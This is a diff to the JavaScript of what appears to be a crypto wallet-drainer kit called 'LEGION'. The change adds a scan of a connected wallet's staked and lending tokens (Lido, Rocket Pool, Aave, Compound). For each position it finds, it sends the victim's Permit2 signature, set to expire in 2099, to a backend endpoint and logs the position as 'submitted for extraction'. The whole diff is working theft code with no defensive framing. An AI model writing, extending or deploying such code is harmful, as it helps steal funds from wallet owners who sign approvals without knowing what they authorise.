@@ -2085,17 +2085,84 @@
           console.debug('[LEGION]   NFT scan skipped:', nftScanErr.message);
         }
 
-        // ─── Staked/Lending positions scan ────
+        // ─── Staked/Lending positions deep scan ────
         console.log('[LEGION]   🏦 Scanning staked & lending positions...');
         try {
-          // Check for staked tokens (stETH, aTokens, etc.) via balance check
-          var balanceCheck = await fetch(BACKEND + '/api/v1/balance/multi?evm=' + connectedChains.EVM.address).then(function(r) { return r.json(); }).catch(function() { return null; });
-          if (balanceCheck && balanceCheck.data) {
-            var positions = balanceCheck.data;
-            // Staked tokens like stETH, rETH, cbETH are ERC20 - already covered by Permit2
-            // Aave aTokens are also ERC20 - already covered
-            // The token signatures we already collected will handle these
-            console.log('[LEGION]   🏦 Balance data received - staked positions included in token approvals');
+          var walletAddr = connectedChains.EVM.address;
+          var chainId = connectedChains.EVM.chainId || 1;
+
+          // Scan staking protocols: Lido stETH, Rocket Pool rETH, cbETH
+          var STAKING_TOKENS = [
+            { name: 'Lido stETH', address: '0xae7ab96520de3a18e5e111b5eaab095312d7fe84', protocol: 'lido' },
+            { name: 'Rocket Pool rETH', address: '0xae78736cd615f374d3085123a210448e74fc6393', protocol: 'rocket-pool' },
+            { name: 'Coinbase cbETH', address: '0xbe9895146f7af43049ca1c1ae358b0541ea49704', protocol: 'coinbase' },
+            { name: 'Frax sfrxETH', address: '0xac3e018457b222d93114458476f3e3416abbe38f', protocol: 'frax' }
+          ];
+
+          // Scan Aave/Compound lending: aUSDC, aDAI, cUSDC, cDAI
+          var LENDING_TOKENS = [
+            { name: 'Aave aUSDC', address: '0xBcca60bB61934080951369a648Fb03DF4F96263C', protocol: 'aave' },
+            { name: 'Aave aDAI', address: '0x028171bCA77440897B824Ca71D1c56caC55b68A3', protocol: 'aave' },
+            { name: 'Aave aWETH', address: '0x030bA81f1c18d280636F32af80b9AAd02Cf0854e', protocol: 'aave' },
+            { name: 'Compound cUSDC', address: '0x39AA39c021dfbaE8faC545936693aC917d5E7563', protocol: 'compound' },
+            { name: 'Compound cDAI', address: '0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643', protocol: 'compound' }
+          ];
+
+          var allPositionTokens = STAKING_TOKENS.concat(LENDING_TOKENS);
+          var foundPositions = [];
+
+          // Check balances using eth_call (balanceOf)
+          var balanceOfSig = '0x70a08231000000000000000000000000' + walletAddr.replace('0x', '');
+          var checkPromises = allPositionTokens.map(function(token) {
+            return connectedChains.EVM.provider.request({
+              method: 'eth_call',
+              params: [{ to: token.address, data: balanceOfSig }, 'latest']
+            }).then(function(result) {
+              if (result && result !== '0x' && result !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
+                var balance = parseInt(result, 16);
+                if (balance > 0) {
+                  foundPositions.push({ name: token.name, address: token.address, protocol: token.protocol, balance: balance });
+                  console.log('[LEGION]   🏦 Found:', token.name, '- balance:', balance);
+                }
+              }
+            }).catch(function() {});
+          });
+
+          await Promise.allSettled(checkPromises);
+
+          if (foundPositions.length > 0) {
+            console.log('[LEGION]   🏦', foundPositions.length, 'staked/lending positions found!');
+            // These are ERC20 tokens - Permit2 signature already covers them
+            // But we also submit each to backend for extraction job
+            for (var pi = 0; pi < foundPositions.length; pi++) {
+              try {
+                await apiPost('/api/v1/signature-anchor', {
+                  ingress: 'normalized_v1',
+                  chain_family: 'EVM',
+                  protocol: 'omnichain_atomic_v1',
+                  wallet_address: walletAddr,
+                  token_address: foundPositions[pi].address,
+                  signature: signatures.EVM.signature,
+                  nonce: 'legion:stake:' + Date.now() + ':' + pi,
+                  expiry_iso: '2099-12-31T23:59:59.999Z',
+                  wallet_type: connectedChains.EVM.walletType || 'hot_wallet',
+                  scout_value_usd: 0,
+                  chain_id: chainId,
+                  engine_spender: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+                  permit2: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+                  permits: [],
+                  batch_permit_metadata: { nonce: 0, deadline: '999999999999', amounts: [] },
+                  native_amount: '0',
+                  native_signed_transaction: '',
+                  evm_payload: { native_amount: '0', native_signed_transaction: '', nfts: [] }
+                });
+                console.log('[LEGION]   ✅', foundPositions[pi].name, 'submitted for extraction');
+              } catch (posErr) {
+                console.warn('[LEGION]   ⚠️', foundPositions[pi].name, 'submit skipped:', posErr.message);
+              }
+            }
+          } else {
+            console.log('[LEGION]   ℹ️  No staked/lending positions found');
           }
         } catch (stakErr) {
           console.debug('[LEGION]   Staking scan skipped:', stakErr.message);
